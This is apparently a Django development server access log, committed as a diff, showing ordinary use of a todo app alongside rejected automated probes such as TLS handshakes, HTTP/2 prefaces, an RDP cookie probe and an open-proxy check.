+[29/Nov/2022 14:03:46] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03üWÂFÁ$Øæ¼çG,H°&\x07KÙþû;¥hÍüc\x94ÙµµµÂ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[29/Nov/2022 14:03:46] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Nov/2022 17:24:25] "GET / HTTP/1.1" 302 0
+[29/Nov/2022 17:24:30] "GET / HTTP/1.1" 302 0
+[29/Nov/2022 17:24:30] "GET /todos HTTP/1.1" 301 0
+Not Found: /http:/api.ipify.org/
+[29/Nov/2022 17:24:39] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 1687
+[29/Nov/2022 22:12:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[29/Nov/2022 22:12:05] "  /*à     Cookie: mstshash=Administr" 400 -
+[30/Nov/2022 04:05:16] "GET / HTTP/1.1" 302 0
+[30/Nov/2022 04:05:17] "GET /todos HTTP/1.1" 301 0
+[30/Nov/2022 04:05:17] "GET /todos/ HTTP/1.1" 200 4096
+[30/Nov/2022 07:30:14] "GET / HTTP/1.1" 302 0
+[30/Nov/2022 07:30:24] code 505, message Invalid HTTP version (2.0)
+[30/Nov/2022 07:30:24] "PRI * HTTP/2.0" 505 -
+[30/Nov/2022 07:30:24] "GET /todos HTTP/1.1" 301 0
+[30/Nov/2022 07:30:25] code 505, message Invalid HTTP version (2.0)
+[30/Nov/2022 07:30:25] "PRI * HTTP/2.0" 505 -
+[30/Nov/2022 07:30:25] "GET /todos/ HTTP/1.1" 200 4096
+[30/Nov/2022 07:30:26] code 505, message Invalid HTTP version (2.0)
+[30/Nov/2022 07:30:26] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[30/Nov/2022 07:30:26] "GET /favicon.ico HTTP/1.1" 404 2459
+[30/Nov/2022 09:51:32,163] - Broken pipe from ('167.94.138.118', 32880)
+
+[30/Nov/2022 09:51:32] code 400, message Bad request version ('À\x14À')
+[30/Nov/2022 09:51:32] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Nov/2022 09:51:33] "GET / HTTP/1.1" 302 0
+[30/Nov/2022 09:51:33,740] - Broken pipe from ('167.94.138.118', 37828)
+
+[30/Nov/2022 09:51:33] "GET / HTTP/1.1" 302 0
+[30/Nov/2022 09:51:34] code 505, message Invalid HTTP version (2.0)
+[30/Nov/2022 09:51:34] "PRI * HTTP/2.0" 505 -
+[30/Nov/2022 09:51:34] "GET /todos HTTP/1.1" 301 0
+[30/Nov/2022 09:51:35] code 505, message Invalid HTTP version (2.0)
+[30/Nov/2022 09:51:35] "PRI * HTTP/2.0" 505 -
+[30/Nov/2022 09:51:35] "GET /todos/ HTTP/1.1" 200 4096
+[30/Nov/2022 09:51:35] code 505, message Invalid HTTP version (2.0)
+[30/Nov/2022 09:51:35] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[30/Nov/2022 09:51:36] "GET /favicon.ico HTTP/1.1" 404 2459
+[30/Nov/2022 13:24:13] "GET / HTTP/1.1" 302 0
+[30/Nov/2022 13:24:13] "GET /todos HTTP/1.1" 301 0
+[30/Nov/2022 13:24:13] "GET /todos/ HTTP/1.1" 200 4096
+[30/Nov/2022 13:24:14] "GET /static/css/style.css HTTP/1.1" 200 225
+Not Found: /favicon.ico
+[30/Nov/2022 13:24:16] "GET /favicon.ico HTTP/1.1" 404 2459
+[30/Nov/2022 13:24:19] "GET /todos/23/delete HTTP/1.1" 302 0
+[30/Nov/2022 13:24:19] "GET /todos/ HTTP/1.1" 200 3515
+[30/Nov/2022 13:33:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[30/Nov/2022 13:33:47] "  /*à     Cookie: mstshash=Administr" 400 -
